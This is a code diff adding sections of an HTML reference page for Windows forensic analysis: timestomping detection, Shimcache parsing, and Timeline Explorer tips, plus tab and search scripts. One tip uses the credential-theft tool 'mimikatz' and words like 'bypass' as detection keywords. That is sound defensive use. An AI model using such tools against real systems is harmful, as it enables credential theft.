+    <div class="alert alert-sus"><strong>Timestomping Detection:</strong> Compare <code>$STANDARD_INFORMATION</code> (SI) timestamps with <code>$FILE_NAME</code> (FN) timestamps. SI can be changed by user-mode tools; FN is harder to change. A mismatch is a "Time Warp" and proves the file was timestomped.</div>
+  </div>
+</div>
+
+<!-- ══════════════ APPCOMPATCACHE TAB ══════════════ -->
+<div id="tab-appcompat" class="tab-pane">
+  <div class="card">
+    <h2><i class="fas fa-history"></i> AppCompatCache (Shimcache)</h2>
+    <p>The <strong>AppCompatCache</strong> (also known as Shimcache) is used by Windows to track application compatibility issues. For forensic analysts, it provides a history of executables that were <strong>present</strong> on the file system and were at some point executed. It is stored in the SYSTEM registry hive.</p>
+    
+    <h3>Key Tools</h3>
+    <a href="https://download.ericzimmermanstools.com/AppCompatCacheParser.zip" target="_blank" class="tool-link"><i class="fas fa-download"></i> AppCompatCacheParser (Eric Zimmerman)</a>
+    
+    <h3>Extraction Command</h3>
+    <div class="cmd-block"><code>AppCompatCacheParser.exe --csv .</code></div>
+    
+    <h3>Forensic Significance</h3>
+    <ul class="step-list">
+      <li><strong>Execution Proof:</strong> If a file is in the Shimcache, it was likely executed (or at least browsed/interacted with in a way that triggered the compatibility engine).</li>
+      <li><strong>Path and Name:</strong> Shows where the file was located.</li>
+      <li><strong>Last Modified:</strong> Includes the standard file system Last Modified time.</li>
+    </ul>
+  </div>
+</div>
+
+<!-- ══════════════ TIMELINE EXPLORER TAB ══════════════ -->
+<div id="tab-timeline" class="tab-pane">
+  <div class="card">
+    <h2><i class="fas fa-stream"></i> Timeline Explorer</h2>
+    <p><strong>Timeline Explorer</strong> is the industry-standard tool for viewing and analyzing the CSV files generated by Eric Zimmerman's tools (MFTECmd, AmcacheParser, SrumECmd, etc.). It handles millions of rows with ease and provides powerful filtering, grouping, and color-coding capabilities.</p>
+    
+    <h3>Download</h3>
+    <a href="https://download.ericzimmermanstools.com/net9/TimelineExplorer.zip" target="_blank" class="tool-link"><i class="fas fa-download"></i> Timeline Explorer (Latest)</a>
+    
+    <h3>Usage Tips</h3>
+    <ul class="step-list">
+      <li><strong>Drag and Drop:</strong> Just drag your generated CSV file into the window.</li>
+      <li><strong>Filtering:</strong> Use the filter row (top row) to quickly search in specific columns (e.g., filter "ProcessName" for "mimikatz").</li>
+      <li><strong>Highlighting:</strong> Use the "Conditional Formatting" feature to highlight rows containing suspicious keywords like "Temp", "AppData", or "bypass".</li>
+      <li><strong>Sync Time:</strong> Ensure your "Time Zone" settings in Timeline Explorer match your analysis machine or are set to UTC to avoid confusion.</li>
+    </ul>
+  </div>
+</div>
+
+</div> <!-- Close content-wrap -->
+
+<script>
+function switchMain(target) {
+    document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
+    document.querySelectorAll('.mtab').forEach(t => t.classList.remove('active'));
+    
+    const panel = document.getElementById('tab-' + target);
+    if (panel) panel.classList.add('active');
+    
+    const tab = Array.from(document.querySelectorAll('.mtab')).find(t => t.getAttribute('onclick').includes("'" + target + "'"));
+    if (tab) tab.classList.add('active');
+    
+    // Reset EV sidebar if switching out of EV
+    if (target !== 'ev') {
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+}
+
+function switchEV(btn, sectionId) {
+    document.querySelectorAll('.ev-section').forEach(s => s.style.display = 'none');
+    document.querySelectorAll('.ev-nav-btn').forEach(b => b.classList.remove('active'));
+    
+    const section = document.getElementById(sectionId);
+    if (section) section.style.display = 'block';
+    btn.classList.add('active');
+    
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+function handleSearch(query) {
+    query = query.toLowerCase().trim();
+    if (!query) return;
+
+    const cards = document.querySelectorAll('.card, .ev-section, .tab-pane');
+    let found = false;
+
+    // Very basic search - highlights sections containing text
+    cards.forEach(card => {
+        if (card.innerText.toLowerCase().includes(query)) {
+            // If it's in an EV section, switch to EV tab and that section
+            if (card.classList.contains('ev-section')) {
+                switchMain('ev');
+                const btn = Array.from(document.querySelectorAll('.ev-nav-btn')).find(b => b.getAttribute('onclick').includes("'" + card.id + "'"));
+                if (btn) switchEV(btn, card.id);
+            } else if (card.id.startsWith('tab-')) {
+                const tabId = card.id.replace('tab-', '');
+                switchMain(tabId);
+            }
+            card.scrollIntoView({ behavior: 'smooth', block: 'center' });
+            found = true;
+            return;
         }
-    </script>
+    });
+}
+</script>
+
 </body>
 </html>
